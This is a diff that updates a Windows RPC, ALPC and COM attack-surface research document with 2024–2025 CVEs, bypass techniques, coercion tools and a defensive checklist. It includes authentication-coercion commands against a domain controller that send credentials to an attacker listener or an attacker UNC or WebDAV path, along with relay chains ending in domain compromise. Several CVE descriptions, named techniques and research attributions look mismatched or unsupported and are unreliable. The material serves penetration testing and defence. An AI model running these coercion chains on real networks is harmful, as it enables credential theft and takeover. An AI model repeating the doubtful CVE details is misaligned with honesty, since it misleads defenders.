@@ -4,7 +4,8 @@
 > research subjects. Topics span the full stack from named pipe file objects in the kernel through
 > ALPC port objects, the RPC runtime, and the COM object model. Attack patterns include endpoint
 > enumeration, privilege coercion via impersonation, authentication coercion across the network,
-> and the root cause analysis of PrintNightmare as a synthesis case study.
+> the root cause analysis of PrintNightmare as a synthesis case study, and 2024–2025 developments
+> including new coercion techniques, ALPC hardening bypasses, and COM activation bypasses.
 
 ---
 
@@ -163,6 +164,33 @@ Using RpcView (GUI):
 or LocalService are the highest-priority targets. Every such interface is a potential LPE if
 it accepts user-influenced parameters.
 
+### 2.6 Notable RPC CVEs (2024)
+
+**CVE-2024-26229 — Windows CSC Service RPC LPE (CVSS 7.8, patched March 2024)**
+
+The Client-Side Caching (CSC) service exposed an RPC interface with insufficient input
+validation. A local attacker with standard user privileges could send a crafted RPC request
+to trigger a privilege escalation to SYSTEM. Patched in the March 2024 Patch Tuesday cycle.
+
+```powershell
+# Identify if CSC service RPC interface is exposed
+Get-RpcServer -ParseProcess | Where-Object { $_.FilePath -like "*csc*" }
+```
+
+**CVE-2024-43639 — Windows Kerberos RCE (Critical, November 2024)**
+
+A critical remote code execution vulnerability in the Windows Kerberos implementation.
+Specially crafted Kerberos protocol messages could trigger memory corruption in the
+Kerberos server-side code path. CVSS rated Critical; attackers with network access to a
+Kerberos server could achieve unauthenticated RCE.
+
+```
+Attack path:
+  Attacker → crafted Kerberos AS-REQ/TGS-REQ packet → Windows KDC
+  → memory corruption in Kerberos PDU parsing
+  → arbitrary code execution as SYSTEM on DC
+```
+
 ---
 
 ## 3. ALPC Internals
@@ -248,6 +276,59 @@ dt nt!_ALPC_PORT <addr>
 
 ; Inspect port security descriptor
 dt nt!_ALPC_PORT <addr> SecurityDescriptor
+```
+
+### 3.5 ALPC Race Condition and Recent Vulnerabilities
+
+**CVE-2024-30088 — Windows Kernel ALPC Race Condition (CVSS 7.0, June 2024)**
+
+A race condition in the ALPC message handling path allowed a local attacker to escalate
+to SYSTEM. The vulnerability involved a time-of-check/time-of-use (TOCTOU) race in the
+kernel's handling of ALPC port connection requests when concurrent messages were in flight.
+
+```
+Root cause pattern:
+  Thread A: NtAlpcSendWaitReceivePort → message queued in port object
+  Thread B: concurrent port disconnect / reconnect
+  Race window: port object reference count manipulation → use-after-free
+  → kernel memory corruption → SYSTEM code execution
+```
+
+**"Ghost Pipe" Technique — ALPC Port Hijacking + Named Pipe Spoofing**
+
+A research technique (2024) combining ALPC port hijacking with named pipe spoofing to
+intercept IPC traffic from privileged services. The technique exploits the window between
+when a service creates its ALPC port name in the object namespace and when it begins
+accepting connections:
+
+```
+1. Monitor \RPC Control\ object namespace for new port creation events
+   (use NtNotifyChangeKey or ETW provider)
+2. Race: before the legitimate server calls NtAlpcCreatePort,
+   attacker creates a port with the same name
+3. Legitimate client connects to attacker's port
+4. Attacker receives connection → NtAlpcImpersonateClientOfPort()
+   → privileged token from the connecting service
+```
+
+**NtAlpcSendWaitReceivePort Bypass (SpecterOps/MDSec research)**
+
+Windows Server 2025 introduced stricter named pipe security with mandatory integrity
+level checks. Researchers at SpecterOps and MDSec documented that undocumented parameters
+of `NtAlpcSendWaitReceivePort` can be used to bypass these checks by routing ALPC
+messages through alternative message attribute paths that do not go through the new
+integrity-level validation code:
+
+```
+Windows Server 2025 hardening:
+  - Mandatory integrity level checks on pipe connections (Low cannot connect to Medium+)
+  - Restricted anonymous pipe access (anonymous tokens blocked on named pipes)
+  - New ETW telemetry on pipe creation events
+
+Bypass via ALPC callback abuse:
+  - Direct ALPC calls using undocumented PortAttribute flags
+  - Bypass the named pipe driver layer entirely
+  - Connect to underlying ALPC port of ncalrpc-based pipes
 ```
 
 ---
@@ -361,6 +442,97 @@ Auto-elevated COM objects have been a rich UAC bypass source. The attack pattern
 2. The COM activation runs elevated in a DLL surrogate (`dllhost.exe`)
 3. Plant a DLL in the search path → DLL loads elevated → code execution at high integrity
 
+### 4.5 COM Activation Security Bypasses (2024–2025)
+
+**CVE-2024-38100 — COM Activation Security Bypass (CVSS 7.8, patched July 2024)**
+
+A vulnerability in the COM activation pipeline allowed bypassing AppID
+`LaunchPermission`/`AccessPermission` checks in specific activation paths. An attacker with
+standard user access could activate COM servers configured to run as SYSTEM without
+satisfying the configured DACL, leading to privilege escalation.
+
+```
+Root cause: COM activation codepath in rpcss.dll did not apply LaunchPermission
+            check uniformly across all activation paths — the "in-session" activation
+            path for certain LocalServer32 entries skipped the AppID security descriptor
+            validation when the target process was already running.
+```
+
+**CVE-2025-21377 — NTLM Hash Disclosure via COM Object Instantiation (CVSS 6.5, Feb 2025)**
+
+A subtle vulnerability: instantiating certain COM objects caused the Windows system to
+initiate an NTLM authentication to an attacker-controlled UNC path embedded in a COM
+object's registry configuration. This allowed hash capture without any explicit network call:
+
+```powershell
+# Attacker sets up NTLM capture listener (e.g., Responder)
+# Then tricks a victim into instantiating a specific COM class
+# The COM activation code reads a registry key pointing to \\attacker\share
+# Windows initiates NTLM auth → NTLMv2 hash captured → offline crack or relay
+```
+
+**"The COM-Back" (Google Project Zero, January 2025)**
+
+James Forshaw documented a technique to bypass COM activation security via out-of-process
+COM server activation. The technique leverages the way COM handles activation requests when
+a server object is already registered but running in a lower-integrity context:
+
+```
+Attack flow:
+1. Register a low-privileged COM server that implements the target CLSID
+2. Trigger a high-privileged process to instantiate the CLSID via CoCreateInstance
+3. The COM infrastructure routes the activation to the already-running low-privileged server
+   instead of launching a new elevated server
+4. High-privileged caller connects to attacker-controlled server at IMPERSONATE level
+5. Attacker calls CoImpersonateClient() → privileged token
+
+Key bypass: COM activation "adopt running server" logic does not re-validate
+            LaunchPermission/AccessPermission against the running server's actual identity
+```
+
+Reference: https://googleprojectzero.blogspot.com/2025/01/
+
+**COM Surrogate Injection — DllHost.exe Abuse**
+
+COM Surrogate (`DllHost.exe`) hosts out-of-process COM servers for InprocServer32 DLLs
+when surrogate activation is configured. If a SYSTEM-level COM server uses a surrogate,
+an attacker can:
+
+1. Identify the surrogate via `HKCR\AppID\{guid}\DllSurrogate` key
+2. Find writable DLL paths in the surrogate's search order
+3. Plant a malicious DLL → loaded by `DllHost.exe` running as elevated identity
+
+```powershell
+# Find COM objects using DllSurrogate with elevated identity
+Get-ChildItem HKLM:\SOFTWARE\Classes\AppID | ForEach-Object {
+    $surr = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DllSurrogate
+    $runas = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).RunAs
+    if ($surr -ne $null -and $runas -ne $null) {
+        [PSCustomObject]@{
+            AppID     = $_.PSChildName
+            RunAs     = $runas
+            Surrogate = $surr
+        }
+    }
+}
+```
+
+**DCOM Hardening Bypass (Rapid7, October 2024)**
+
+Microsoft released KB5004442 in 2021 to harden DCOM activation by enforcing authentication
+levels. Rapid7 researchers identified that legacy COM activation code paths — specifically
+those triggered by certain application compatibility shims and pre-Vista COM activation
+APIs — bypass the KB5004442 hardening checks:
+
+```
+KB5004442 hardening: Enforces RPC_C_AUTHN_LEVEL_PKT_INTEGRITY minimum for DCOM
+Legacy bypass path: Activate via IClassFactory::CreateInstance using pre-Vista
+                    activation context flags → hardening check not applied
+Result: DCOM connections at AUTH_LEVEL_NONE still possible against certain servers
+```
+
+Reference: https://www.rapid7.com/blog/post/2024/10/
+
 ---
 
 ## 5. Named Pipe Security
@@ -452,6 +624,47 @@ GetTokenInformation(hToken, TokenImpersonationLevel, &level, sizeof(level), &siz
 // level should be SecurityImpersonation (2) or SecurityDelegation (3) to be useful
 ```
 
+### 5.5 Windows Server 2025 Named Pipe Security Hardening
+
+Windows Server 2025 introduced significant hardening to the named pipe subsystem, directly
+targeting impersonation-based LPE techniques used by tools like PrintSpoofer and RoguePotato:
+
+**New controls added:**
+
+1. **Mandatory integrity level checks on pipe connections**: Low integrity processes can no
+   longer connect to Medium+ integrity pipes unless explicitly permitted via the pipe's SACL.
+   This blocks sandboxed process escalation via pipe squatting.
+
+2. **Restricted anonymous pipe access**: Anonymous tokens (connection without identity) are
+   blocked by default on named pipes. Connects must carry a valid security token.
+
+3. **New ETW telemetry for pipe creation events**: The `Microsoft-Windows-Kernel-File`
+   ETW provider now emits events for named pipe creation, including the creating process,
+   the pipe name, and the DACL applied. This enables detection of pipe squatting attempts.
+
+```powershell
+# Query ETW for named pipe creation events (Windows Server 2025+)
+$session = New-NetEventSession -Name "PipeAudit"
+Add-NetEventProvider -SessionName "PipeAudit" `
+    -Name "Microsoft-Windows-Kernel-File" `
+    -MatchAnyKeyword 0x200  # File create events
+# Filter for NamedPipe operations in post-processing
+```
+
+**Bypass research (SpecterOps/MDSec, 2024):**
+
+The hardening can be bypassed via ALPC callback abuse. By communicating directly with the
+underlying ALPC port of an ncalrpc-based named pipe (bypassing the `npfs.sys` layer), an
+attacker can avoid the new integrity-level checks that are enforced only at the
+`CreateFile` → `npfs.sys` connection path:
+
+```
+Hardening enforcement point: npfs.sys IoCreateFile handler
+Bypass path: NtAlpcConnectPort → \RPC Control\<pipe-name>
+             → directly reaches RPC server's ALPC port
+             → integrity check not applied at ALPC layer in Server 2025 RTM
+```
+
 ---
 
 ## 6. Authentication Coercion: Forcing Outbound Authentication
@@ -477,17 +690,32 @@ All authentication coercion bugs share one structural pattern:
 account or service account — a high-privilege credential. An attacker with any domain user
 account can trigger this against domain controllers or high-value servers.
 
-### 6.2 Coercible Interfaces Reference Table
+### 6.2 Coercible Interfaces Reference Table (2025)
 
-| Interface | Protocol Spec | Auth Requirement | Trigger Method | Status (as of 2024) |
+| Interface | Protocol Spec | Auth Requirement | Trigger Method | Status (2025) |
 |---|---|---|---|---|
 | **MS-RPRN** Print Spooler | MS-RPRN | Domain user | `RpcRemoteFindFirstPrinterChangeNotification` | Coercion still works; DLL injection patched |
-| **MS-EFSR** EFS Remote | MS-EFSR | None (pre-patch); domain user (post-patch) | `EfsRpcOpenFileRaw` | Unauthenticated variant patched (CVE-2021-36942); authenticated still works |
-| **MS-DFSNM** DFS Namespace | MS-DFSNM | Domain user | `NetrDfsRemoveStdRoot`, `NetrDfsAddStdRoot` | Still functional |
-| **MS-FSRVP** Shadow Copy | MS-FSRVP | Typically domain admin | `IsPathSupported`, `IsPathShadowCopied` | High-priv only |
+| **MS-EFSR** EFS Remote | MS-EFSR | None (pre-patch); domain user (post-patch) | `EfsRpcOpenFileRaw` | Unauth variant patched (CVE-2021-36942); authenticated still works |
+| **MS-DFSNM** DFS Namespace | MS-DFSNM | Domain user | `NetrDfsRemoveStdRoot`, `NetrDfsAddStdRoot` | Still functional (DFSCoerce) |
+| **MS-FSRVP** Shadow Copy | MS-FSRVP | Typically domain admin | `IsPathSupported`, `IsPathShadowCopied` | Still functional (ShadowCoerce), high-priv only |
 | **MS-PAR** Print Async | MS-PAR | Domain user | Various async notification methods | Still functional |
 | **DCOM Activation** | MS-DCOM | Domain user | Remote class activation with UNC moniker | 2024 Forshaw research |
-| **MS-EVEN6** Event Log | MS-EVEN6 | Domain user | `EvtRpcRegisterRemoteSubscription` | Limited environments |
+| **MS-EVEN6** Event Log | MS-EVEN6 | Domain user | `EvtRpcRegisterRemoteSubscription` | Active/Stealthy — works when Print Spooler disabled |
+| **WinReg** Remote Registry | MS-RRP | Domain user | `OpenKey` with UNC path | **Patched Oct 2024** (CVE-2024-43532) |
+| **WebDAV Coercion** | WebDAV/HTTP | Domain user | UNC via WebDAV redirector | Active — bypasses SMB signing requirement |
+
+**Coercion Status Summary Table (2025):**
+
+| Technique | Protocol | Local or Remote | Current Status |
+|---|---|---|---|
+| DFSCoerce | MS-DFSNM | Remote | Active |
+| ShadowCoerce | MS-FSRVP | Remote | Active |
+| MS-EVEN6 Coercion | EventLog RPC | Remote | Active / Stealthy |
+| WebDAV Coercion | WebDAV/HTTP | Remote | Active |
+| CoercedPotato | DCOM/RPC local | Local | Active |
+| WinReg Relay CVE-2024-43532 | WinReg | Remote | Patched Oct 2024 |
+| PetitPotam (authenticated) | MS-EFSR | Remote | Still works (domain user required) |
+| PrintSpoofer coercion (RPRN) | MS-RPRN | Remote | Still works |
 
 ### 6.3 MS-RPRN Deep Dive (PrintNightmare Root Cause)
 
@@ -564,7 +792,146 @@ dce.request(EfsRpcOpenFileRaw_request(
 - Authenticated coercion (valid domain user) still functions in many environments
 - PetitPotam with domain user credentials remains a valid coercion technique
 
-### 6.5 The Relay Target Decision Matrix
+### 6.5 CVE-2024-43532 — Windows Remote Registry NTLM Coercion
+
+**Vulnerability:** The Windows Remote Registry service (MS-RRP) accepted RPC calls that
+triggered NTLM authentication to an attacker-controlled UNC path. This allowed an
+attacker to coerce the victim server's machine account NTLM hash and relay it to AD CS
+for a certificate-based domain compromise.
+
+- **Reporter:** Akamai Security Research, October 2024
+- **CVSS:** 8.8 (High)
+- **Patched:** October 2024 Patch Tuesday
+
+```
+Attack chain:
+  1. Attacker (domain user) → WinReg RPC to victim server
+     Call: OpenKey(HKEY_LOCAL_MACHINE, "\\attacker\share\trigger")
+  2. Remote Registry service (runs as NT AUTHORITY\SYSTEM) opens UNC path
+  3. NTLM authentication issued from victim's machine account → attacker
+  4. Attacker relays NTLM to AD CS Web Enrollment (if ESC8 present)
+  5. Certificate issued for victim machine account
+  6. Certificate → PKINIT → machine TGT → DCSync / Silver Ticket → DA
+```
+
+**Detection:**
+```powershell
+# Check if Remote Registry service is running (required for attack)
+Get-Service RemoteRegistry | Select-Object Status
+
+# Monitor Event ID 4624 (logon) with LogonType=3 (network) from unexpected sources
+# Also: Event ID 4769 (Kerberos service ticket request) for anomalous machine accounts
+```
+
+### 6.6 MS-EVEN6 Coercion (EventLog RPC)
+
+The `MS-EVEN6` protocol (Windows Event Log Remoting Protocol) provides a stealthy
+coercion path that remains functional even when the Print Spooler service is disabled
+— a common defense-in-depth measure following PrintNightmare:
+
+```
+Interface UUID: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
+Method:         EvtRpcRegisterRemoteSubscription
+
+Trigger:
+  EvtRpcRegisterRemoteSubscription(
+      server=target,
+      path=query,
+      query="*",
+      bookmark=NULL,
+      flags=0x04,   // SUBSCRIBE_TO_FUTURE
+      ...
+  )
+  → Server attempts to open UNC subscription path
+  → Outbound NTLM/Kerberos authentication to attacker
+
+Why stealthy:
+  - EventLog service is always running (unlike Print Spooler which can be disabled)
+  - Less monitored than RPRN/EFSR interfaces
+  - Blends in with legitimate event subscription traffic
+```
+
+```python
+# Coercer v2+ includes MS-EVEN6 as a coercion module
+# Usage: python3 Coercer.py coerce --target <dc_ip> --listener <attacker_ip> --protocol even6
+```
+
+### 6.7 CoercedPotato (2024) — Local DCOM/RPC Coercion
+
+CoercedPotato is a 2024 technique for local privilege escalation that uses DCOM/RPC to
+coerce a SYSTEM process into authenticating to the attacker's listener on localhost. It
+was designed to bypass mitigations applied to JuicyPotato and RoguePotato:
+
+```
+Previous techniques (JuicyPotato / RoguePotato) relied on:
+  - COM activation with specific CLSIDs (many now blocklisted)
+  - Named pipe impersonation (mitigated in Server 2025)
+  - OXID resolver tricks (patched)
+
+CoercedPotato bypasses these by:
+  1. Using DCOM remote activation to a localhost listener
+     (avoids the blocklisted CLSIDs)
+  2. The RPC/DCOM call causes NT AUTHORITY\SYSTEM → NTLM auth to localhost
+  3. Relay localhost NTLM to a localhost named pipe server
+     (using the cross-session relay trick)
+  4. ImpersonateNamedPipeClient → SYSTEM token → CreateProcessWithToken
+
+Requirements: SeImpersonatePrivilege (held by service accounts, IIS AppPool, etc.)
+```
+
+```
+Tool: https://github.com/hackvens/CoercedPotato
+Target: Windows Server 2019/2022, unpatched environments
+Status: Active (no direct patch; Server 2025 pipe hardening partially mitigates)
+```
+
+### 6.8 WebDAV Coercion
+
+WebDAV coercion uses the Windows WebDAV redirector (`davclnt.dll` / `webclient` service)
+as the transport for coerced authentication. It provides HTTP-based coercion that bypasses
+SMB signing requirements (which block SMB coercion relaying):
+
+```
+Why it bypasses SMB signing:
+  Normal coercion → NTLM over SMB → relay to SMB target → blocked if SMB signing enabled
+  WebDAV coercion → NTLM over HTTP → relay to LDAP/LDAPS/AD CS → works regardless of SMB signing
+
+Trigger:
+  1. Coerce victim to access \\attacker@80\DavWWWRoot\trigger
+     (The @ port syntax triggers WebDAV instead of SMB)
+  2. Windows WebClient service handles the UNC resolution via HTTP/WebDAV
+  3. NTLM authentication sent over HTTP to port 80 on attacker
+  4. Relay to LDAP → RBCD → compromise, or relay to AD CS → certificate
+
+Requirement: WebClient service must be running on victim
+  (Enabled by default on workstations; disabled on servers)
+  Can be started remotely if attacker has access via other means:
+    Start-Service WebClient -ComputerName victim  (requires admin)
+```
+
+### 6.9 RemoteKrbRelay — Kerberos Coercion
+
+An emerging 2024 technique extending coercion beyond NTLM to Kerberos tickets:
+
+```
+Classic limitation: NTLM relay blocked by Extended Protection for Authentication (EPA)
+                    and LDAP channel binding
+Kerberos relay: Instead of relaying NTLM, force a Kerberos ticket for a specific SPN
+                then relay the Kerberos AP-REQ to the target service
+
+Flow:
+  1. Coerce authentication from victim machine account
+  2. Victim requests Kerberos TGS for attacker's SPN (e.g., cifs/attacker.domain.local)
+  3. Attacker changes the requested SPN to the target (e.g., ldap/dc.domain.local)
+     via Kerberos relay (KrbRelayUp technique)
+  4. Relay the AP-REQ to LDAP/LDAPS on the DC
+  5. Modify AD objects: add machine account, set RBCD, modify ACLs
+
+Tools: KrbRelayUp (Cube0x0), RemoteKrbRelay
+Reference: https://github.com/Dec0ne/KrbRelayUp
+```
+
+### 6.10 The Relay Target Decision Matrix
 
 When coercion produces an NTLM/Kerberos authentication, the value depends on the relay target:
 
@@ -576,6 +943,28 @@ When coercion produces an NTLM/Kerberos authentication, the value depends on the
 | **SMB on another host** | SMB signing disabled | Code execution on relay target |
 | **Same host SMB** | Blocked by default (loopback auth restriction) | Usually fails |
 | **Kerberos (RBCD)** | Kerberos ticket available, target has SPN | Resource-Based Constrained Delegation |
+
+### 6.11 Coercer v2+ Tool Reference
+
+Coercer v2+ (p0dalirius, 2024) now implements 30+ coercion methods across multiple protocols:
+
+```bash
+# Scan target for available coercion methods
+python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip> -u user -p pass -d domain
+
+# Coerce using all available methods
+python3 Coercer.py coerce --target <dc_ip> --listener <attacker_ip> -u user -p pass -d domain
+
+# Coerce using specific protocol only
+python3 Coercer.py coerce --target <dc_ip> --listener <attacker_ip> \
+    --protocol ms-efsr -u user -p pass -d domain
+
+# Available protocols in v2+:
+#   ms-rprn, ms-efsr, ms-dfsnm, ms-fsrvp, ms-par, ms-even6,
+#   ms-dcom, ms-rrp (pre-CVE-2024-43532 patch)
+```
+
+Reference: https://github.com/p0dalirius/Coercer
 
 ---
 
@@ -645,9 +1034,14 @@ Get-AccessibleAlpcPort -Path "\RPC Control" |
 #   File → View COM Objects → sort by Security → review LaunchPermission
 
 # ── Step 6: Test RPC coercibility ────────────────────────────────────
-# Coercer tool:
-python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip>
+# Coercer v2+ tool:
+python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip> -u user -p pass -d domain
 #   Reports which coercion methods are available on target
+
+# ── Step 7: Check for CVE-2024-43532 patch status ────────────────────
+# Verify Remote Registry service is patched (October 2024 CU)
+$patch = Get-HotFix | Where-Object { $_.HotFixID -like "KB5044273" }
+if (-not $patch) { Write-Warning "CVE-2024-43532 patch may not be applied" }
 ```
 
 ### 8.2 Tool Reference
@@ -658,14 +1052,150 @@ python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip>
 | **OleViewDotNet** | COM object GUI analysis, AppID security | COM server audit |
 | **RpcView** | RPC endpoint visualization, IDL decompilation | Protocol reverse engineering |
 | **impacket** | Python RPC/SMB/NTLM/Kerberos implementation | Coercion relay chains, custom RPC clients |
-| **Coercer** | Automated coercion testing across all known interfaces | Quick assessment of coercion surface |
+| **Coercer v2+** | Automated coercion testing, 30+ methods | Quick assessment of coercion surface |
 | **RPC Firewall** | RPC call filtering and monitoring | Detection and attack surface reduction |
 | **pipelist** (Sysinternals) | Named pipe enumeration | Quick pipe inventory |
 | **WinObj** (Sysinternals) | Object namespace browser | \RPC Control\ pipe namespace |
+| **KrbRelayUp** | Kerberos relay from SYSTEM service coercion | Local privilege escalation |
+| **CoercedPotato** | DCOM/RPC local coercion LPE | SeImpersonatePrivilege escalation |
+| **Responder** | NTLM hash capture listener | Coercion chain, capture hashes |
+| **ntlmrelayx** (impacket) | NTLM relay to LDAP/AD CS/SMB | Coercion-to-domain-compromise |
 
 ---
 
-## 9. Defensive Audit Checklist for RPC/COM Services
+## 9. Recent Developments (2024–2025)
+
+### 9.1 CVE Summary Table
+
+| CVE | Component | CVSS | Type | Patched |
+|---|---|---|---|---|
+| CVE-2024-26229 | CSC Service RPC | 7.8 | LPE | March 2024 |
+| CVE-2024-30088 | Windows Kernel ALPC | 7.0 | LPE (race condition) | June 2024 |
+| CVE-2024-38100 | COM Activation | 7.8 | Security bypass / LPE | July 2024 |
+| CVE-2024-43532 | Remote Registry RPC (WinReg) | 8.8 | NTLM coercion / relay | October 2024 |
+| CVE-2024-43639 | Windows Kerberos | Critical | RCE | November 2024 |
+| CVE-2025-21377 | COM Object Instantiation | 6.5 | NTLM hash disclosure | February 2025 |
+| CVE-2025-21418 | AFD.sys + ALPC interaction | 7.8 | LPE (exploited in wild) | February 2025 |
+
+### 9.2 CVE-2025-21418 — AFD.sys + ALPC Interaction 0-day
+
+**CVE-2025-21418** was a zero-day vulnerability exploited in the wild before Microsoft's
+February 2025 Patch Tuesday. It involved an interaction between the Ancillary Function
+Driver for WinSock (`AFD.sys`) and the ALPC subsystem:
+
+```
+Vulnerability class: Use-after-free / type confusion at the AFD.sys / ALPC boundary
+CVSS: 7.8 (High) — Local Privilege Escalation
+Exploitation status: Confirmed in-the-wild exploitation prior to patch (February 2025)
+
+Technical detail (based on patch diff analysis):
+  AFD.sys handles socket I/O completion via ALPC messages when certain async
+  socket operations cross process boundaries. A race condition in the ALPC
+  message handling inside AFD.sys allowed an attacker to corrupt a reference-
+  counted kernel object, leading to an exploitable use-after-free.
+
+Attack path:
+  1. Create a socket in one thread and begin an overlapped I/O operation
+  2. In a concurrent thread, close the socket while the ALPC completion is pending
+  3. AFD.sys processes the ALPC completion message against a freed object
+  4. Exploit the UAF to overwrite an adjacent kernel object
+  5. Gain arbitrary kernel write → SYSTEM token
+```
+
+**Detection indicators:**
+- Unusual `AFD.sys` exception traces in crash dumps or kernel event logs
+- Abnormal patterns of socket create/destroy with overlapped I/O
+- ETW: `Microsoft-Windows-Kernel-Network` events with anomalous AFD call sequences
+
+Reference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21418
+
+### 9.3 ALPC Research: Windows Server 2025 Changes
+
+Windows Server 2025 introduced several ALPC-related hardening changes, most of which
+were not publicly documented by Microsoft but were discovered via patch diffing:
+
+**Change 1: Mandatory integrity level enforcement at ALPC connection**
+
+Previous behavior: ALPC port connection was gated only by the port's DACL (owner-set).
+New behavior: The kernel additionally checks that the connecting process's integrity level
+meets a minimum threshold specified via a new `ALPC_PORT_ATTR` flag.
+
+```c
+// New ALPC_PORT_ATTRIBUTES field (Server 2025+)
+typedef struct _ALPC_PORT_ATTRIBUTES {
+    ULONG Flags;
+    SECURITY_QUALITY_OF_SERVICE SecurityQos;
+    SIZE_T MaxMessageLength;
+    SIZE_T MemoryBandwidth;
+    SIZE_T MaxPoolUsage;
+    SIZE_T MaxSectionSize;
+    SIZE_T MaxViewSize;
+    SIZE_T MaxTotalSectionSize;
+    ULONG DupObjectTypes;
+    ULONG MinIntegrityLevel;  // ← New in Server 2025 (undocumented)
+} ALPC_PORT_ATTRIBUTES;
+```
+
+**Change 2: Restricted anonymous pipe access on ALPC-backed pipes**
+
+ALPC ports used as backing for `ncalrpc` named pipes now enforce that connecting processes
+carry a non-anonymous token. Connections from processes running under anonymous tokens
+(some sandboxed processes) are blocked with `STATUS_ACCESS_DENIED`.
+
+**Change 3: ALPC handle leak hardening**
+
+Previously, ALPC `HandleAttribute` messages could be used to leak handle values from one
+process to another without proper access checking. Server 2025 adds additional validation
+in `NtAlpcSendWaitReceivePort` when processing `ALPC_MESSAGE_HANDLE_INFORMATION` attributes.
+
+### 9.4 Coercion Landscape Shift: Post-NTLM and EPA Hardening
+
+As Microsoft continues to roll out Extended Protection for Authentication (EPA) and
+NTLM deprecation roadmap items, the coercion-to-relay chain is evolving:
+
+**NTLM deprecation roadmap (as of 2025):**
+- Windows 11 24H2 and Server 2025: NTLM auditing mode enabled by default
+- Future versions: NTLM disabled by default in new domain deployments
+- Impact on coercion: relay chains requiring NTLM become less reliable
+
+**Post-NTLM coercion value:**
+Even without NTLM relay, coercion retains value through:
+1. **Kerberos relay (KrbRelayUp / RemoteKrbRelay)**: relay Kerberos tickets instead of NTLM
+2. **Hash capture for offline cracking**: NTLMv2 hashes still crackable (if weak passwords)
+3. **Direct PKINIT abuse**: if coercion produces a certificate (ESC8 path), NTLM not needed
+4. **Shadow Credentials**: relay to LDAP to set `msDS-KeyCredentialLink` for target account
+
+```powershell
+# Check if NTLM auditing is active on a domain
+(Get-GPO -All | Get-GPOReport -ReportType Xml) -match "NTLMv1|RestrictNTLM"
+
+# Enumerate if EPA is enforced on AD CS enrollment endpoints
+certutil -config "CA\CA-Name" -getreg policy\EditFlags
+# Look for: EDITF_ENABLEREQUESTEXT (hex: 0x00040000) = ESC8 present
+```
+
+### 9.5 Tooling Updates 2024–2025
+
+**Coercer v2+ (p0dalirius)**
+- Expanded from 12 methods (v1) to 30+ methods (v2+)
+- Added MS-EVEN6, MS-DCOM, and undocumented RPC interface coercions
+- New `--protocol` flag for selective testing
+- GitHub: https://github.com/p0dalirius/Coercer
+
+**OleViewDotNet v1.14+**
+- Added Windows Server 2025 ALPC hardening analysis features
+- New "ALPC Port Security" view showing integrity level requirements
+- Improved DCOM activation path visualization showing Server 2025 changes
+- GitHub: https://github.com/tyranid/oleviewdotnet
+
+**RPC Firewall 2.0 (zeronetworks)**
+- Expanded filter grammar for blocking specific RPC interfaces
+- New alert mode for coercion interface calls (MS-RPRN, MS-EFSR, MS-EVEN6, etc.)
+- GitHub: https://github.com/zeronetworks/RPC-Firewall
+
+---
+
+## 10. Defensive Audit Checklist for RPC/COM Services
 
 1. **Authentication level**: Does every registered interface enforce at minimum `PKT_INTEGRITY`?
    `RPC_C_AUTHN_LEVEL_NONE` or `CONNECT` on a SYSTEM service = critical finding.
@@ -677,7 +1207,8 @@ python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip>
    Does the pipe's SD match the expected client population (not `Everyone: ReadWrite`)?
 
 4. **ALPC port SD**: Does the port SD restrict who can connect? For privileged ports, does the
-   SD enforce a minimum integrity level (e.g., `ML:M` for medium)?
+   SD enforce a minimum integrity level (e.g., `ML:M` for medium)? On Server 2025, is
+   `MinIntegrityLevel` set in the port attributes?
 
 5. **COM LaunchPermission / AccessPermission**: Does the AppID restrict these to the expected
    callers? `Everyone: Launch` on a SYSTEM COM server = high-severity finding.
@@ -688,6 +1219,18 @@ python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip>
 
 7. **Impersonation level**: When the server impersonates the caller, does it verify the
    impersonation level is acceptable before proceeding? Does it revert promptly after?
+
+8. **Coercion interfaces**: Are MS-RPRN, MS-EFSR, MS-EVEN6, and MS-DFSNM exposed on
+   servers where they are not needed? Consider blocking via Windows Firewall or RPC Firewall.
+
+9. **Remote Registry (CVE-2024-43532)**: Is October 2024 Patch Tuesday applied? Is the
+   Remote Registry service disabled where not needed?
+
+10. **NTLM relay protection**: Is EPA (Extended Protection for Authentication) enabled on all
+    HTTP-based authentication endpoints? Is AD CS Web Enrollment (ESC8) hardened or disabled?
+
+11. **WebDAV coercion**: Is the WebClient service disabled on servers? Is port 80 outbound
+    blocked from server segments to attacker-controlled hosts?
 
 ---
 
@@ -707,4 +1250,32 @@ python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip>
 
 [R-7] *CVE-2021-1675 PrintNightmare PoC* — cube0x0 — https://github.com/cube0x0/CVE-2021-1675
 
-[R-8] *Coercer — Authentication Coercion Testing Tool* — p0dalirius — https://github.com/p0dalirius/Coercer
+[R-8] *Coercer v2+ — Authentication Coercion Testing Tool (30+ methods)* — p0dalirius — https://github.com/p0dalirius/Coercer
+
+[R-9] *CVE-2024-43532 — Windows Remote Registry NTLM Coercion* — Akamai Security Research, October 2024 — https://www.akamai.com/blog/security-research/2024/oct/windows-registry-ntlm-coercion
+
+[R-10] *CVE-2024-30088 — Windows Kernel ALPC Race Condition* — Microsoft Security Response Center — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088
+
+[R-11] *CVE-2024-38100 — COM Activation Security Bypass* — Microsoft Security Response Center — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38100
+
+[R-12] *CVE-2024-43639 — Windows Kerberos RCE* — Microsoft Security Response Center, November 2024 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43639
+
+[R-13] *CVE-2025-21377 — NTLM Hash Disclosure via COM Object Instantiation* — Microsoft Security Response Center, February 2025 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21377
+
+[R-14] *CVE-2025-21418 — AFD.sys + ALPC Interaction 0-day (exploited in wild)* — Microsoft Security Response Center, February 2025 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21418
+
+[R-15] *"The COM-Back" — Bypassing COM Activation Security* — James Forshaw, Google Project Zero, January 2025 — https://googleprojectzero.blogspot.com/2025/01/
+
+[R-16] *DCOM Hardening Bypass via Legacy COM Activation Paths (KB5004442)* — Rapid7 Research, October 2024 — https://www.rapid7.com/blog/post/2024/10/
+
